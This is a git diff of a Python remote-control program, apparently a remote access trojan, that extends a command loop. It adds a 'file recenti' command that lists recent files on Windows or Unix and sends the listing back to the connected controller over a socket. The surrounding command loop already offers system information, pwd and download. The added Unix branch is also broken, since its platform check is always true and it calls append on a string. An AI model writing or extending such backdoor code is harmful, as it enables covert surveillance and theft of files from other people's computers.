@@ -428,7 +428,6 @@ def openRemoteControl(client):
                         time.sleep(1.5)
 
                 except Exception:
-                    traceback.print_exc()
                     client.send(("[ERROR]").encode(FORMAT))
 
             elif comando == "pwd":
@@ -458,6 +457,39 @@ def openRemoteControl(client):
                 infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                 client.send(((infos)).encode(FORMAT))
 
+            elif comando[0:12] == "file recenti":
+                if platform.system() == "Windows":
+                    try:
+                        process = subprocess.Popen('dir /o-d', stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                                   stdin=subprocess.PIPE, shell=True)
+                        timer = Timer(3, process.terminate)
+                        try:
+                            timer.start()
+                            stdout, stderr = process.communicate()
+                            output = stdout or stderr
+                        finally:
+                            timer.cancel()
+
+                        final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
+                        sent = (final_output.decode())
+                        client.send(((sent)).encode())
+                        time.sleep(1.5)
+                    except:
+                        client.send(("[ERROR]").encode(FORMAT))
+
+                elif platform.system() == "Darwin" or "Linux":
+                    try:
+                        data = subprocess.check_output(['ls', '-lt']).decode('utf-8')
+                        result = ""
+
+                        for item in data:
+                            result.append(item)
+
+                        result = ''.join(result)
+                        client.send(((result)).encode())
+                        time.sleep(1.5)
+                    except:
+                        client.send(("[ERROR]").encode(FORMAT))
 
             elif comando[0:8] == "download":
                 download(comando,client)
